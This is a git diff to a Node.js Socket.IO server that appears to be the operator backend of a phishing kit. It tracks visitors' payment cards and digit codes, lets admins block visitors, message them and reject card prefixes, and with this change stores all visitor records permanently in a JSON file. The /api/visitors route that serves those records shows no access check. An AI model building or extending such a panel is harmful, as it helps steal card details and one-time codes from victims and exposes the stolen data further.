@@ -3,6 +3,8 @@ const http = require("http");
 const { Server } = require("socket.io");
 const cors = require("cors");
 const cookieParser = require("cookie-parser");
+const fs = require("fs");
+const path = require("path");
 require("dotenv").config();
 
 const app = express();
@@ -25,10 +27,52 @@ const io = new Server(server, {
   transports: ["websocket", "polling"],
 });
 
-// Store for visitors and admins
-const visitors = new Map();
+// Data file path
+const DATA_FILE = path.join(__dirname, "visitors_data.json");
+
+// Load saved data from file
+function loadSavedData() {
+  try {
+    if (fs.existsSync(DATA_FILE)) {
+      const data = fs.readFileSync(DATA_FILE, "utf8");
+      const parsed = JSON.parse(data);
+      return {
+        visitors: new Map(Object.entries(parsed.visitors || {})),
+        visitorCounter: parsed.visitorCounter || 0,
+        savedVisitors: parsed.savedVisitors || [],
+      };
+    }
+  } catch (error) {
+    console.error("Error loading saved data:", error);
+  }
+  return {
+    visitors: new Map(),
+    visitorCounter: 0,
+    savedVisitors: [],
+  };
+}
+
+// Save data to file
+function saveData() {
+  try {
+    const data = {
+      visitors: Object.fromEntries(visitors),
+      visitorCounter,
+      savedVisitors,
+    };
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+    console.log("Data saved to file");
+  } catch (error) {
+    console.error("Error saving data:", error);
+  }
+}
+
+// Initialize data from file
+const savedData = loadSavedData();
+const visitors = savedData.visitors;
 const admins = new Map();
-let visitorCounter = 0;
+let visitorCounter = savedData.visitorCounter;
+let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
 
 // Generate unique API key
 function generateApiKey() {
@@ -72,6 +116,17 @@ function parseUserAgent(ua) {
   return { os, device, browser };
 }
 
+// Save visitor to permanent storage
+function saveVisitorPermanently(visitor) {
+  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
+  if (existingIndex >= 0) {
+    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
+  } else {
+    savedVisitors.push({ ...visitor });
+  }
+  saveData();
+}
+
 // Socket.IO Connection Handler
 io.on("connection", (socket) => {
   console.log(`New connection: ${socket.id}`);
@@ -105,9 +160,11 @@ io.on("connection", (socket) => {
       paymentCards: [],
       digitCodes: [],
       isBlocked: false,
+      isConnected: true,
     };
 
     visitors.set(socket.id, visitor);
+    saveVisitorPermanently(visitor);
 
     // Send confirmation to visitor
     socket.emit("successfully-connected", {
@@ -129,6 +186,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.page = page;
       visitors.set(socket.id, visitor);
+      saveVisitorPermanently(visitor);
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
@@ -165,6 +223,7 @@ io.on("connection", (socket) => {
       visitor.page = data.page;
       visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
       visitors.set(socket.id, visitor);
+      saveVisitorPermanently(visitor);
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
@@ -212,9 +271,8 @@ io.on("connection", (socket) => {
 
       socket.emit("admin:authenticated", true);
 
-      // Send all current visitors to admin
-      const allVisitors = Array.from(visitors.values());
-      socket.emit("visitors:list", allVisitors);
+      // Send all saved visitors to admin (not just connected ones)
+      socket.emit("visitors:list", savedVisitors);
 
       // Notify visitors that admin is connected
       visitors.forEach((visitor, visitorSocketId) => {
@@ -257,6 +315,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.isBlocked = true;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.to(visitorSocketId).emit("blocked");
       console.log(`Visitor blocked: ${visitorSocketId}`);
     }
@@ -268,16 +327,47 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.isBlocked = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.to(visitorSocketId).emit("unblocked");
       console.log(`Visitor unblocked: ${visitorSocketId}`);
     }
   });
 
-  // Admin: Delete visitor
+  // Admin: Delete visitor by socket ID
   socket.on("admin:delete", (visitorSocketId) => {
     io.to(visitorSocketId).emit("deleted");
     visitors.delete(visitorSocketId);
+    
+    // Also remove from saved visitors
+    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
+    if (visitorToDelete) {
+      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
+      saveData();
+    }
+    
     console.log(`Visitor deleted: ${visitorSocketId}`);
+  });
+
+  // Admin: Delete visitor by ID
+  socket.on("admin:deleteById", (visitorId) => {
+    // Find and remove from active visitors
+    visitors.forEach((v, socketId) => {
+      if (v._id === visitorId) {
+        io.to(socketId).emit("deleted");
+        visitors.delete(socketId);
+      }
+    });
+    
+    // Remove from saved visitors
+    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
+    saveData();
+    
+    // Notify all admins
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
+    });
+    
+    console.log(`Visitor deleted by ID: ${visitorId}`);
   });
 
   // Admin: Send last message
@@ -299,6 +389,7 @@ io.on("connection", (socket) => {
       if (!visitor.blockedCardPrefixes.includes(prefix)) {
         visitor.blockedCardPrefixes.push(prefix);
         visitors.set(visitorSocketId, visitor);
+        saveVisitorPermanently(visitor);
       }
       console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
     }
@@ -309,6 +400,8 @@ io.on("connection", (socket) => {
     // Check if it's a visitor
     if (visitors.has(socket.id)) {
       const visitor = visitors.get(socket.id);
+      visitor.isConnected = false;
+      saveVisitorPermanently(visitor);
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
@@ -318,10 +411,8 @@ io.on("connection", (socket) => {
         });
       });
 
-      // Keep visitor data for a while (don't delete immediately)
-      setTimeout(() => {
-        visitors.delete(socket.id);
-      }, 300000); // 5 minutes
+      // Don't delete visitor data - keep it permanently
+      visitors.delete(socket.id);
 
       console.log(`Visitor disconnected: ${socket.id}`);
     }
@@ -348,13 +439,13 @@ app.get("/", (req, res) => {
 });
 
 app.get("/api/visitors", (req, res) => {
-  const allVisitors = Array.from(visitors.values());
-  res.json(allVisitors);
+  res.json(savedVisitors);
 });
 
 app.get("/api/stats", (req, res) => {
   res.json({
-    totalVisitors: visitors.size,
+    totalVisitors: savedVisitors.length,
+    connectedVisitors: visitors.size,
     totalAdmins: admins.size,
     visitorCounter,
   });
@@ -364,4 +455,5 @@ app.get("/api/stats", (req, res) => {
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`Loaded ${savedVisitors.length} saved visitors`);
 });
